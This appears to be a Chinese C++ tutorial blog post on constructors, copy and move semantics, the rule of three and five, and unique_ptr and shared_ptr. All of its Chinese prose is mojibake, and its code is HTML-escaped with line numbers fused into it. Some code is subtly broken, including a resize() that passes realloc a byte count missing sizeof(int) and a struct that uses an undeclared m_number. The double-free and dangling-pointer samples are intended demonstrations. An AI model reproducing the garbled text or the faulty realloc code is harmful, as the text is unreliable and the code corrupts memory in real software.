ç›¸æ¯”ï¼Œæœ€å¤§çš„å¥½å¤„æ˜¯æ¯ä¸ªå±æ€§éƒ½æœ‰åå­—ï¼Œä¸å®¹æ˜“æé”™ã€‚ å‡½æ•°çš„å‚æ•°ï¼Œå¦‚æœæ˜¯å¾ˆå¤æ‚çš„ç±»å‹ï¼Œä½ ä¸æƒ³æŠŠç±»å‹åé‡å¤å†™ä¸€éï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ {} åˆå§‹åŒ–åˆ—è¡¨æ¥ç®€åŒ– 123456789101112void func(std::tuple&lt;int, float, std::string&gt; arg, std::vector&lt;int&gt; arr) &#123; ...&#125;int main() &#123; func(&#123;1, 3.14f, \"ä½©å¥‡\"&#125;, &#123;1, 4, 2, 8, 5, 7&#125;); // ç­‰ä»·äºï¼š func(std::tuple&lt;int, float, std::string&gt;(1, 3.14f, \"ä½©å¥‡\"), std::vector&lt;int&gt;(&#123;1, 4, 2, 8, 5, 7&#125;)); // ï¼ˆC++17èµ·ï¼‰ç­‰ä»·äºï¼š func(std::tuple(1, 3.14f, \"ä½©å¥‡\"), std::vector(&#123;1, 4, 2, 8, 5, 7&#125;));&#125; ä¸€æ—¦æˆ‘ä»¬å®šä¹‰äº†è‡ªå·±çš„æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨å°±ä¸ä¼šå†ç”Ÿæˆé»˜è®¤çš„æ— å‚æ„é€ å‡½æ•°ã€‚ æœ‰è‡ªå®šä¹‰æ„é€ å‡½æ•°æ—¶ä»æƒ³ç”¨é»˜è®¤æ„é€ å‡½æ•°ï¼š= default 12345678910struct Pig &#123; std::string m_name; int m_weight&#123;0&#125;; Pig() = default; Pig(std::string name, int weight) : m_name(name), m_weight(weight) &#123;&#125;&#125;; æ‹·è´æ„é€ å‡½æ•° ç¼–è¯‘å™¨é»˜è®¤ä¼šç”Ÿæˆæ‹·è´æ„é€ å‡½æ•°ï¼šPig(Pig const &amp;) 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight&#123;0&#125;;&#125;;void show(Pig pig) &#123; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl;&#125;int main() &#123; Pig pig&#123;\"ä½©å¥‡\", 80&#125;; show(pig); Pig pig2 = pig; // è°ƒç”¨ Pig(Pig const &amp;) // Pig pig2(pig); // ä¸ä¸Šä¸€ç§æ–¹å¼ç­‰ä»· show(pig); return 0;&#125; æ‹·è´èµ‹å€¼å‡½æ•° ç¼–è¯‘å™¨é»˜è®¤è¿˜ä¼šç”Ÿæˆè¿™æ ·ä¸€ä¸ªé‡è½½â€™=â€™è¿™ä¸ªè¿ç®—ç¬¦çš„å‡½æ•°ï¼š Pig &amp;operator=(Pig const &amp;other); 1234Pig pig = pig2; // æ‹·è´æ„é€ Pig pig; // æ— å‚æ„é€ pig = pig2; // æ‹·è´èµ‹å€¼ è¿½æ±‚æ€§èƒ½æ—¶æ¨èç”¨æ‹·è´æ„é€ ï¼Œå› ä¸ºå¯ä»¥é¿å…ä¸€æ¬¡æ— å‚æ„é€ ï¼Œæ‹·è´èµ‹å€¼æ˜¯å‡ºäºéœ€è¦ä¸´æ—¶ä¿®æ”¹å¯¹è±¡çš„çµæ´»æ€§éœ€è¦ã€‚ å¦‚ä½•é¿å…ä¸ç»æ„çš„éšå¼æ‹·è´ å°†æ‹·è´æ„é€ å‡½æ•°å£°æ˜ä¸º explicit çš„ï¼Œè¿™æ ·éšå¼çš„æ‹·è´å°±ä¼šå‡ºé”™ã€‚ 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight&#123;0&#125;; Pig(std::string name, int weight) : m_name(name), m_weight(weight) &#123;&#125; explicit Pig(Pig const &amp;other) = default;&#125;;void show(Pig pig) &#123; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl;&#125;int main() &#123; Pig pig&#123;\"ä½©å¥‡\", 80&#125;; // show(pig); // ç¼–è¯‘é”™è¯¯ show(Pig&#123;pig&#125;); return 0;&#125; è‡ªåŠ¨ç”Ÿæˆçš„ç‰¹æ®Šå‡½æ•° 12345678910struct C &#123; C(); // é»˜è®¤æ„é€ å‡½æ•° C(C const &amp;c); // æ‹·è´æ„é€ å‡½æ•° C(C &amp;&amp;c); // ç§»åŠ¨æ„é€ å‡½æ•°ï¼ˆC++11 å¼•å…¥ï¼‰ C &amp;operator=(C const &amp;c); // æ‹·è´èµ‹å€¼å‡½æ•° C &amp;operator=(C &amp;&amp;c); // ç§»åŠ¨èµ‹å€¼å‡½æ•°ï¼ˆC++11 å¼•å…¥ï¼‰ ~C(); // è§£æ„å‡½æ•°&#125;; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight&#123;0&#125;; Pig(std::string name, int weight) : m_name(name), m_weight(weight) &#123;&#125; Pig() &#123;&#125; Pig(Pig const &amp;other) : m_name(other.m_name) , m_weight(other.m_weight) &#123;&#125; Pig &amp;operator=(Pig const &amp;other) &#123; m_name = other.m_name; m_weight = other.m_weight; return *this; &#125; Pig(Pig &amp;&amp;other) : m_name(std::move(other.m_name)) , m_weight(std::move(other.m_weight)) &#123;&#125; Pig &amp;operator=(Pig &amp;&amp;other) &#123; m_name = std::move(other.m_name); m_weight = std::move(other.m_weight); return *this; &#125; ~Pig() &#123;&#125;&#125;;void show(Pig pig) &#123; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl;&#125;int main() &#123; Pig pig; show(pig); return 0;&#125; å¦‚æœå…¶ä¸­ä¸€ä¸ªæˆå‘˜ï¼ˆæ¯”å¦‚m_nameï¼‰ä¸æ”¯æŒæ‹·è´æ„é€ å‡½æ•°ï¼Œé‚£ä¹ˆ Pig ç±»çš„æ‹·è´æ„é€ å‡½æ•°å°†ä¸ä¼šè¢«ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆã€‚ è®¾è®¡è§„åˆ™ ç»éªŒ å¦‚æœä¸€ä¸ªç±»å®šä¹‰äº†ææ„å‡½æ•°ï¼Œé‚£ä¹ˆæ‚¨å¿…é¡»åŒæ—¶å®šä¹‰æˆ–åˆ é™¤ æ‹·è´æ„é€ å‡½æ•°å’Œæ‹·è´èµ‹å€¼å‡½æ•°ï¼Œå¦åˆ™å‡ºé”™ã€‚ å¦‚æœä¸€ä¸ªç±»å®šä¹‰æˆ–åˆ é™¤äº†æ‹·è´æ„é€ å‡½æ•°ï¼Œé‚£ä¹ˆæ‚¨å¿…é¡»åŒæ—¶å®šä¹‰æˆ–åˆ é™¤ æ‹·è´èµ‹å€¼å‡½æ•°ï¼Œå¦åˆ™å‡ºé”™ï¼Œåˆ é™¤å¯å¯¼è‡´ä½æ•ˆã€‚ å¦‚æœä¸€ä¸ªç±»å®šä¹‰äº†ç§»åŠ¨æ„é€ å‡½æ•°ï¼Œé‚£ä¹ˆæ‚¨å¿…é¡»åŒæ—¶å®šä¹‰æˆ–åˆ é™¤ ç§»åŠ¨èµ‹å€¼å‡½æ•°ï¼Œå¦åˆ™å‡ºé”™ï¼Œåˆ é™¤å¯å¯¼è‡´ä½æ•ˆã€‚ å¦‚æœä¸€ä¸ªç±»å®šä¹‰äº†æ‹·è´æ„é€ å‡½æ•°æˆ–æ‹·è´èµ‹å€¼å‡½æ•°ï¼Œé‚£ä¹ˆæ‚¨å¿…é¡»æœ€å¥½åŒæ—¶å®šä¹‰ ç§»åŠ¨æ„é€ å‡½æ•°æˆ– ç§»åŠ¨èµ‹å€¼å‡½æ•°ï¼Œå¦åˆ™ä½æ•ˆã€‚ ä¾‹å¦‚ï¼š åœ¨ = æ—¶ï¼Œé»˜è®¤æ˜¯ä¼šæ‹·è´çš„ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;cstdlib&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;struct Vector &#123; size_t m_size; int *m_data; Vector(size_t n) &#123; m_size = n; m_data = (int *)malloc(n * sizeof(int)); &#125; ~Vector() &#123; free(m_data); &#125; size_t size() &#123; return m_size; &#125; void resize(size_t size) &#123; m_size = size; m_data = (int *)realloc(m_data, m_size); &#125; int &amp;operator[](size_t index) &#123; return m_data[index]; &#125;&#125;;int main() &#123; Vector v1(32); Vector v2 = v1; // Vector v2(v1); // ä¸ä¸Šä¸€ç§ç­‰ä»· return 0; // è‡ªåŠ¨é‡Šæ”¾ v1, v2&#125; 1free(): double free detected in tcache 2 å½“å‰ Vector çš„å®ç°é€ æˆä¸€ä¸ªå¾ˆå¤§çš„é—®é¢˜ï¼šå…¶ m_data æŒ‡é’ˆæ˜¯æŒ‰åœ°å€å€¼æµ…æ‹·è´çš„ï¼Œè€Œä¸æ·±æ‹·è´å…¶æŒ‡å‘çš„æ•°ç»„ï¼ åœ¨é€€å‡º main å‡½æ•°ä½œç”¨åŸŸçš„æ—¶å€™ï¼Œv1.m_data ä¼šè¢«é‡Šæ”¾ä¸¤æ¬¡ï¼æ›´å±é™©çš„åˆ™æ˜¯ v1 è¢«è§£æ„è€Œ v2 ä»åœ¨è¢«ä½¿ç”¨çš„æƒ…å†µã€‚ è¿™å°±æ˜¯ä¸ºä»€ä¹ˆâ€œå¦‚æœä¸€ä¸ªç±»å®šä¹‰äº†è§£æ„å‡½æ•°ï¼Œé‚£ä¹ˆæ‚¨å¿…é¡»åŒæ—¶å®šä¹‰æˆ–åˆ é™¤æ‹·è´æ„é€ å‡½æ•°å’Œæ‹·è´èµ‹å€¼å‡½æ•°ï¼Œå¦åˆ™å‡ºé”™ã€‚â€ æœ€ç®€å•çš„åŠæ³•æ˜¯ï¼Œç›´æ¥ç¦æ­¢ç”¨æˆ·æ‹·è´è¿™ä¸ªç±»çš„å¯¹è±¡ï¼Œåœ¨ C++11 ä¸­å¯ä»¥ç”¨ = delete è¡¨ç¤ºè¿™ä¸ªå‡½æ•°è¢«åˆ é™¤ï¼Œè®©ç¼–è¯‘å™¨ä¸è¦è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªé»˜è®¤çš„ï¼ˆä¼šå¯¼è‡´æŒ‡é’ˆæµ…æ‹·è´çš„ï¼‰æ‹·è´æ„é€ å‡½æ•°äº†ã€‚ è¿™æ ·å°±å¯ä»¥åœ¨ç¼–è¯‘æœŸæå‰å‘ç°é”™è¯¯ 12345678910111213141516171819202122232425262728struct Vector &#123; size_t m_size; int *m_data; Vector(size_t n) &#123; m_size = n; m_data = (int *)malloc(n * sizeof(int)); &#125; ~Vector() &#123; free(m_data); &#125; Vector(Vector const &amp;other) = delete; size_t size() &#123; return m_size; &#125; void resize(size_t size) &#123; m_size = size; m_data = (int *)realloc(m_data, m_size); &#125; int &amp;operator[](size_t index) &#123; return m_data[index]; &#125;&#125;; å¦‚æœéœ€è¦å…è®¸ç”¨æˆ·æ‹·è´ä½ çš„ Vector ç±»å¯¹è±¡ï¼Œä¿è¯ä»»ä½•å•ä¸ªæ“ä½œå‰åï¼Œå¯¹è±¡éƒ½æ˜¯å¤„äºæ­£ç¡®çš„çŠ¶æ€ï¼Œä»è€Œé¿å…ç¨‹åºè¯»åˆ°é”™è¯¯æ•°æ®ï¼ˆå¦‚ç©ºæ‚¬æŒ‡é’ˆï¼‰çš„æƒ…å†µã€‚ 1234567891011121314151617181920212223242526272829303132struct Vector &#123; size_t m_size; int *m_data; Vector(size_t n) &#123; m_size = n; m_data = (int *)malloc(n * sizeof(int)); &#125; ~Vector() &#123; free(m_data); &#125; Vector(Vector const &amp;other) &#123; m_size = other.m_size; m_data = (int *)malloc(m_size * sizeof(int)); memcpy(m_data, other.m_data, m_size * sizeof(int)); &#125; size_t size() &#123; return m_size; &#125; void resize(size_t size) &#123; m_size = size; m_data = (int *)realloc(m_data, m_size); &#125; int &amp;operator[](size_t index) &#123; return m_data[index]; &#125;&#125;; åŒºåˆ†æ‹·è´æ„é€ å’Œæ‹·è´èµ‹å€¼ åŒºåˆ†ä¸¤ç§æ‹·è´å¯ä»¥æé«˜æ€§èƒ½ã€‚ int x = 1; // æ‹·è´æ„é€ å‡½æ•° x = 2; // æ‹·è´èµ‹å€¼å‡½æ•° æ‹·è´èµ‹å€¼å‡½æ•° â‰ˆ è§£æ„å‡½æ•° + æ‹·è´æ„é€ å‡½æ•°ã€‚ æ‹·è´æ„é€ ï¼šç›´æ¥æœªåˆå§‹åŒ–çš„å†…å­˜ä¸Šæ„é€  2 æ‹·è´èµ‹å€¼ï¼šå…ˆé”€æ¯ç°æœ‰çš„ 1ï¼Œå†é‡æ–°æ„é€  2 12345678910111213...Vector(Vector const &amp;other) &#123; m_size = other.m_size; m_data = (int *)malloc(m_size * sizeof(int)); memcpy(m_data, other.m_data, m_size * sizeof(int)); &#125; Vector &amp;operator=(Vector const &amp;other) &#123; this-&gt;~Vector(); // å…ˆé”€æ¯ç°æœ‰çš„ new (this) Vector(other); // å†é‡æ–°æ„é€ ï¼ˆplacement newï¼‰ return *this; // æ”¯æŒè¿ç­‰å·ï¼šv1 = v2 = v3 &#125;... æ›´é«˜æ•ˆçš„å†™æ³• 123456Vector &amp;operator=(Vector const &amp;other) &#123; m_size = other.m_size; m_data = (int *)realloc(m_data, m_size * sizeof(int)); memcpy(m_data, other.m_data, m_size * sizeof(int)); return *this; &#125; å†…å­˜çš„é”€æ¯é‡æ–°åˆ†é…å¯ä»¥é€šè¿‡reallocï¼Œä»è€Œå°±åœ°åˆ©ç”¨å½“å‰ç°æœ‰çš„m_dataï¼Œé¿å…é‡æ–°åˆ†é…ã€‚ æ‹·è´å’Œç§»åŠ¨ æ—¶é—´å¤æ‚åº¦ï¼šç§»åŠ¨æ˜¯ O(1)ï¼Œæ‹·è´æ˜¯ O(n)ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include &lt;vector&gt;void test_copy() &#123; std::vector&lt;int&gt; v1(10); std::vector&lt;int&gt; v2(200); v1 = v2; // æ‹·è´èµ‹å€¼ O(n) std::cout &lt;&lt; \"after copy:\" &lt;&lt; std::endl; std::cout &lt;&lt; \"v1 length \" &lt;&lt; v1.size() &lt;&lt; std::endl; // 200 std::cout &lt;&lt; \"v2 length \" &lt;&lt; v2.size() &lt;&lt; std::endl; // 200&#125;void test_move() &#123; std::vector&lt;int&gt; v1(10); std::vector&lt;int&gt; v2(200); v1 = std::move(v2); // ç§»åŠ¨èµ‹å€¼ O(1) std::cout &lt;&lt; \"after move:\" &lt;&lt; std::endl; std::cout &lt;&lt; \"v1 length \" &lt;&lt; v1.size() &lt;&lt; std::endl; // 200 std::cout &lt;&lt; \"v2 length \" &lt;&lt; v2.size() &lt;&lt; std::endl; // 0&#125;void test_swap() &#123; std::vector&lt;int&gt; v1(10); std::vector&lt;int&gt; v2(200); std::swap(v1, v2); // äº¤æ¢ä¸¤è€… O(1) std::cout &lt;&lt; \"after swap:\" &lt;&lt; std::endl; std::cout &lt;&lt; \"v1 length \" &lt;&lt; v1.size() &lt;&lt; std::endl; // 200 std::cout &lt;&lt; \"v2 length \" &lt;&lt; v2.size() &lt;&lt; std::endl; // 10&#125;int main() &#123; test_copy(); test_move(); test_swap(); return 0;&#125; swap å¯èƒ½æ˜¯è¿™æ ·å®ç°çš„ï¼š 123456template &lt;class T&gt;void swap(T&amp; t1, T&amp; t2) &#123; T tmp = std::move(t2); t2 = std::move(t1); t1 = std::move(tmp);&#125; swap åœ¨é«˜æ€§èƒ½è®¡ç®—ä¸­å¯ä»¥ç”¨æ¥å®ç°åŒç¼“å­˜ï¼ˆping-pong bufferï¼‰ã€‚ å“ªäº›æƒ…å†µä¼šè§¦å‘â€œç§»åŠ¨â€ è¿™äº›æƒ…å†µä¸‹ç¼–è¯‘å™¨ä¼šè°ƒç”¨ç§»åŠ¨ï¼š 123return v2; // v2 ä½œè¿”å›å€¼v1 = std::vector&lt;int&gt;(200); // å°±åœ°æ„é€ çš„ v2v1 = std::move(v2); // æ˜¾å¼åœ°ç§»åŠ¨ è¿™äº›æƒ…å†µä¸‹ç¼–è¯‘å™¨ä¼šè°ƒç”¨æ‹·è´ï¼š 12return std::as_const(v2) // æ˜¾å¼åœ°æ‹·è´v1 = v2 // é»˜è®¤æ‹·è´ æ³¨æ„ï¼Œä¸‹é¢ä¸¤ä¸ªè¯­å¥æ²¡æœ‰ä»»ä½•ä½œç”¨ï¼š è¿™ä¸¤ä¸ªå‡½æ•°åªæ˜¯è´Ÿè´£è½¬æ¢ç±»å‹ï¼Œå®é™…äº§ç”Ÿç§»åŠ¨/æ‹·è´æ•ˆæœçš„æ˜¯åœ¨ç±»çš„æ„é€ /èµ‹å€¼å‡½æ•°é‡Œã€‚ 12std::move(v2) // ä¸ä¼šæ¸…ç©º v2ï¼Œéœ€è¦æ¸…ç©ºå¯ä»¥ç”¨ v2 = &#123;&#125; æˆ– v2.clear()std::as_const(v2) // ä¸ä¼šæ‹·è´ v2ï¼Œéœ€è¦æ‹·è´å¯ä»¥ç”¨ &#123; auto _ = v2; &#125; ç§»åŠ¨æ„é€ å‡½æ•° é»˜è®¤ç§»åŠ¨æ„é€ å’Œç§»åŠ¨èµ‹å€¼ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è¿™æ ·åšï¼š ç§»åŠ¨æ„é€ â‰ˆæ‹·è´æ„é€ +ä»–è§£æ„+ä»–é»˜è®¤æ„é€  ç§»åŠ¨èµ‹å€¼â‰ˆæ‹·è´èµ‹å€¼+ä»–è§£æ„+ä»–é»˜è®¤æ„é€  è™½ç„¶ä½æ•ˆï¼Œä½†è‡³å°‘å¯ä»¥ä¿è¯ä¸å‡ºé”™ã€‚ è‹¥è‡ªå®šä¹‰äº†ç§»åŠ¨æ„é€ ï¼Œåˆ™ï¼š ç§»åŠ¨èµ‹å€¼â‰ˆè§£æ„ï¼ˆå½“å‰è‡ªèº«çš„èµ„æºï¼‰+ ç§»åŠ¨æ„é€  123456789101112Vector(Vector &amp;&amp;other) &#123; m_size = other.m_size; other.m_size = 0; m_data = other.m_data; other.m_data = nullptr;&#125;Vector &amp;operator=(Vector &amp;&amp;other) &#123; this-&gt;~Vector(); new (this) Vector(std::move(other)); return *this;&#125; å¦‚æœæœ‰ç§»åŠ¨èµ‹å€¼å‡½æ•°ï¼Œå¯ä»¥åˆ é™¤æ‹·è´èµ‹å€¼å‡½æ•°ã€‚é‚£ä¹ˆï¼Œå½“ç”¨æˆ·è°ƒç”¨ï¼š 1v2 = v1; æ—¶ï¼Œå› ä¸ºæ‹·è´èµ‹å€¼è¢«åˆ é™¤ï¼Œç¼–è¯‘å™¨ä¼šå°è¯•ï¼š 1v2 = List(v1) ä»è€Œå…ˆè°ƒç”¨æ‹·è´æ„é€ å‡½æ•°ï¼ˆæ‹·è´v1ï¼‰ï¼Œç„¶åå› ä¸º List(v1) ç›¸å½“äºå°±åœ°æ„é€ çš„å¯¹è±¡ï¼Œä»è€Œå˜æˆäº†ç§»åŠ¨è¯­ä¹‰ï¼Œä»è€Œè¿›ä¸€æ­¥è°ƒç”¨ç§»åŠ¨èµ‹å€¼å‡½æ•°ã€‚ æ™ºèƒ½æŒ‡é’ˆ unique_ptr C++11 å¼•å…¥äº† unique_ptr å®¹å™¨ï¼Œä»–çš„è§£æ„å‡½æ•°ä¸­ä¼šè°ƒç”¨ delete p 12345678910111213141516171819202122232425#include &lt;cstdio&gt;#include &lt;cstdlib&gt;struct C &#123; C() &#123; printf(\"åˆ†é…å†…å­˜!\\n\"); &#125; ~C() &#123; printf(\"é‡Šæ”¾å†…å­˜!\\n\"); &#125;&#125;;int main() &#123; C *p = new C; if (rand() != 0) &#123; printf(\"å‡ºäº†ç‚¹å°çŠ¶å†µâ€¦â€¦\\n\"); // delete p; // ç¨‹åºå‘˜ç²—å¿ƒå¿˜è®°é‡Šæ”¾æŒ‡é’ˆ return 1; &#125; delete p; return 0;&#125; unique_ptr åˆ™æŠŠä¸‹é¢è¿ä¸ªæ“ä½œå°è£…æˆä¸€ä¸ªæ“ä½œ 12delete p;p = nullptr; åªéœ€è¦ï¼š 1p = nullptr; // ç­‰ä»·äºï¼šp.reset() = nullptr æ—¶ï¼Œå°±é‡Šæ”¾äº† unique_ptr ã€‚ 12345678910int main() &#123; std::unique_ptr&lt;C&gt; p = std::make_unique&lt;C&gt;(); if (1 + 1 == 2) &#123; printf(\"å‡ºäº†ç‚¹å°çŠ¶å†µâ€¦â€¦\\n\"); return 1; // è‡ªåŠ¨é‡Šæ”¾ p &#125; return 0; // è‡ªåŠ¨é‡Šæ”¾ p&#125; ç¦æ­¢æ‹·è´ 12345int main() &#123; std::unique_ptr&lt;C&gt; p = std::make_unique&lt;C&gt;(); func(p); // å‡ºé”™ return 0;&#125; å› ä¸º unique_ptr åˆ é™¤äº†æ‹·è´æ„é€ å‡½æ•°ã€‚å¦‚æœè¦æ‹·è´ï¼Œæœ‰ä»¥ä¸‹æ–¹æ³•ï¼š ç¬¬ä¸€ç§æ˜¯è·å–åŸå§‹æŒ‡é’ˆï¼Œä½ çš„ func() å®é™…ä¸Šå¹¶ä¸éœ€è¦â€œå¤ºèµ°â€èµ„æºçš„å æœ‰æƒï¼ˆownershipï¼‰ã€‚ func() åªæ˜¯è°ƒç”¨äº† p çš„æŸä¸ªæˆå‘˜å‡½æ•°è€Œå·²ï¼Œå¹¶æ²¡æœ‰æ¥è¿‡æŒç®¡å¯¹è±¡ç”Ÿå‘½å‘¨æœŸçš„å¤§æƒã€‚ 1234567891011121314151617181920212223242526#include &lt;cstdio&gt;#include &lt;memory&gt;struct C &#123; C() &#123; printf(\"åˆ†é…å†…å­˜!\\n\"); &#125; ~C() &#123; printf(\"é‡Šæ”¾å†…å­˜!\\n\"); &#125; void do_something() &#123; printf(\"æˆå‘˜å‡½æ•°!\\n\"); &#125;&#125;;void func(C *p) &#123; p-&gt;do_something();&#125;int main() &#123; std::unique_ptr&lt;C&gt; p = std::make_unique&lt;C&gt;(); func(p.get()); return 0;&#125; ç¬¬äºŒç§æ˜¯ç§»åŠ¨ï¼Œä½ çš„ func() éœ€è¦â€œå¤ºèµ°â€èµ„æºçš„å æœ‰æƒã€‚ func æŠŠæŒ‡é’ˆæ”¾åˆ°ä¸€ä¸ªå…¨å±€çš„åˆ—è¡¨é‡Œï¼Œp çš„ç”Ÿå‘½å‘¨æœŸå°†ä¼šå˜å¾—å’Œ objlist ä¸€æ ·é•¿ã€‚å› æ­¤éœ€è¦æ¥è¿‡æŒç®¡å¯¹è±¡ç”Ÿå‘½å‘¨æœŸçš„å¤§æƒã€‚ 12345678910111213141516171819202122232425262728293031#include &lt;cstdio&gt;#include &lt;memory&gt;#include &lt;vector&gt;struct C &#123; C() &#123; printf(\"åˆ†é…å†…å­˜!\\n\"); &#125; ~C() &#123; printf(\"é‡Šæ”¾å†…å­˜!\\n\"); &#125; void do_something() &#123; printf(\"æˆ‘çš„æ•°å­—æ˜¯ %d!\\n\", m_number); &#125;&#125;;std::vector&lt;std::unique_ptr&lt;C&gt;&gt; objlist;void func(std::unique_ptr&lt;C&gt; p) &#123; objlist.push_back(std::move(p)); // è¿›ä¸€æ­¥ç§»åŠ¨åˆ° objlist&#125;int main() &#123; std::unique_ptr&lt;C&gt; p = std::make_unique&lt;C&gt;(); printf(\"ç§»äº¤å‰ï¼š%p\\n\", p.get()); // ä¸ä¸º null func(std::move(p)); // é€šè¿‡ç§»åŠ¨æ„é€ å‡½æ•°ï¼Œè½¬ç§»æŒ‡é’ˆæ§åˆ¶æƒ printf(\"ç§»äº¤åï¼š%p\\n\", p.get()); // nullï¼Œå› ä¸ºç§»åŠ¨ä¼šæ¸…é™¤åŸå¯¹è±¡ return 0;&#125; 1234åˆ†é…å†…å­˜!ç§»äº¤å‰ï¼š0x55ec91b162b0ç§»äº¤åï¼š(nil)é‡Šæ”¾å†…å­˜! å¦‚æœï¼Œç§»äº¤æ§åˆ¶æƒåä»å¸Œæœ›è®¿é—®åˆ° p æŒ‡å‘çš„å¯¹è±¡ã€‚æœ€ç®€å•çš„åŠæ³•æ˜¯ï¼Œåœ¨ç§»äº¤æ§åˆ¶æƒç»™ func å‰ï¼Œæå‰é€šè¿‡ p.get() è·å–åŸå§‹æŒ‡é’ˆã€‚ 12345678int main() &#123; std::unique_ptr&lt;C&gt; p = std::make_unique&lt;C&gt;(); func(std::move(p)); p-&gt;do_something(); // å‡ºé”™ï¼Œp å·²ç»ä¸ºç©ºäº†ï¼ return 0;&#125; 12345678910int main() &#123; std::unique_ptr&lt;C&gt; p = std::make_unique&lt;C&gt;(); C *raw_p = p.get(); func(std::move(p)); raw_p-&gt;do_something(); // æ­£å¸¸æ‰§è¡Œï¼Œraw_p ä¿ç•™äº†è½¬ç§»å‰çš„æŒ‡é’ˆ return 0;&#125; ä¸è¿‡ä½ å¾—ä¿è¯ raw_p çš„å­˜åœ¨æ—¶é—´ä¸è¶…è¿‡ p çš„ç”Ÿå‘½å‘¨æœŸï¼Œå¦åˆ™ä¼šå‡ºç°å±é™©çš„ç©ºæ‚¬æŒ‡é’ˆã€‚ 1234567891011121314int main() &#123; std::unique_ptr&lt;C&gt; p = std::make_unique&lt;C&gt;(); C *raw_p = p.get(); func(std::move(p)); raw_p-&gt;do_something(); // æ­£å¸¸æ‰§è¡Œï¼Œraw_p ä¿ç•™äº†è½¬ç§»å‰çš„æŒ‡é’ˆ objlist.clear(); // åˆšåˆš p ç§»äº¤ç»™ func çš„ç”Ÿå‘½å‘¨æœŸç»“æŸäº†ï¼ raw_p-&gt;do_something(); // é”™è¯¯ï¼raw_p æŒ‡å‘çš„å¯¹è±¡å·²ç»è¢«é‡Šæ”¾ï¼ return 0;&#125; 1234åˆ†é…å†…å­˜!æˆ‘çš„æ•°å­—æ˜¯ 42!é‡Šæ”¾å†…å­˜!æˆ‘çš„æ•°å­—æ˜¯ -803182608! shared_ptr ç‰ºç‰²æ•ˆç‡æ¢æ¥è‡ªç”±åº¦çš„ shared_ptr åˆ™å…è®¸æ‹·è´ï¼Œä»–è§£å†³é‡å¤é‡Šæ”¾çš„æ–¹å¼æ˜¯é€šè¿‡å¼•ç”¨è®¡æ•°ã€‚ å½“ä¸€ä¸ª shared_ptr åˆå§‹åŒ–æ—¶ï¼Œå°†è®¡æ•°å™¨è®¾ä¸º1ã€‚ å½“ä¸€ä¸ª shared_ptr è¢«æ‹·è´æ—¶ï¼Œè®¡æ•°å™¨åŠ 1ã€‚ å½“ä¸€ä¸ª shared_ptr è¢«è§£æ„æ—¶ï¼Œè®¡æ•°å™¨å‡1ã€‚å‡åˆ°0æ—¶ï¼Œåˆ™è‡ªåŠ¨é”€æ¯ä»–æŒ‡å‘çš„å¯¹è±¡ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;cstdio&gt;#include &lt;memory&gt;#include &lt;vector&gt;struct C &#123; int m_number; C() &#123; printf(\"åˆ†é…å†…å­˜!\\n\"); m_number = 42; &#125; ~C() &#123; printf(\"é‡Šæ”¾å†…å­˜!\\n\"); m_number = -2333333; &#125; void do_something() &#123; printf(\"æˆ‘çš„æ•°å­—æ˜¯ %d!\\n\", m_number); &#125;&#125;;std::vector&lt;std::shared_ptr&lt;C&gt;&gt; objlist;void func(std::shared_ptr&lt;C&gt; p) &#123; objlist.push_back(std::move(p)); // è¿™é‡Œç”¨ç§»åŠ¨å¯ä»¥æ›´é«˜æ•ˆï¼Œä½†ä¸å¿…é¡»&#125;int main() &#123; std::shared_ptr&lt;C&gt; p = std::make_shared&lt;C&gt;(); // å¼•ç”¨è®¡æ•°åˆå§‹åŒ–ä¸º1 func(p); // shared_ptr å…è®¸æ‹·è´ï¼å’Œå½“å‰æŒ‡é’ˆå…±äº«æ‰€æœ‰æƒï¼Œå¼•ç”¨è®¡æ•°åŠ 1 func(p); // å¤šæ¬¡ä¹Ÿæ²¡é—®é¢˜~ å¤šä¸ª shared_ptr ä¼šå…±äº«æ‰€æœ‰æƒï¼Œå¼•ç”¨è®¡æ•°åŠ 1 p-&gt;do_something(); // æ­£å¸¸æ‰§è¡Œï¼Œp æŒ‡å‘çš„åœ°å€æœ¬æ¥å°±æ²¡æœ‰æ”¹å˜ objlist.clear(); // åˆšåˆš p ç§»äº¤ç»™ func çš„ç”Ÿå‘½å‘¨æœŸç»“æŸäº†ï¼å¼•ç”¨è®¡æ•°å‡2 p-&gt;do_something(); // æ­£å¸¸æ‰§è¡Œï¼Œå› ä¸ºå¼•ç”¨è®¡æ•°è¿˜å‰©1ï¼Œä¸ä¼šè¢«é‡Šæ”¾ return 0; // åˆ°è¿™é‡Œæœ€åä¸€ä¸ªå¼•ç”¨ p ä¹Ÿè¢«é‡Šæ”¾ï¼Œp æŒ‡å‘çš„å¯¹è±¡æ‰ç»ˆäºé‡Šæ”¾&#125; åªè¦è¿˜æœ‰å­˜åœ¨å“ªæ€•ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘è¯¥å¯¹è±¡ï¼Œå°±ä¸ä¼šè¢«è§£æ„ã€‚ å¯ä»¥ä½¿ç”¨ p.use_count() æ¥è·å–å½“å‰æŒ‡é’ˆçš„å¼•ç”¨è®¡æ•°ã€‚ æ³¨æ„ p.func() æ˜¯ shared_ptr ç±»å‹æœ¬èº«çš„æˆå‘˜å‡½æ•°ï¼Œè€Œ p-&gt;func() 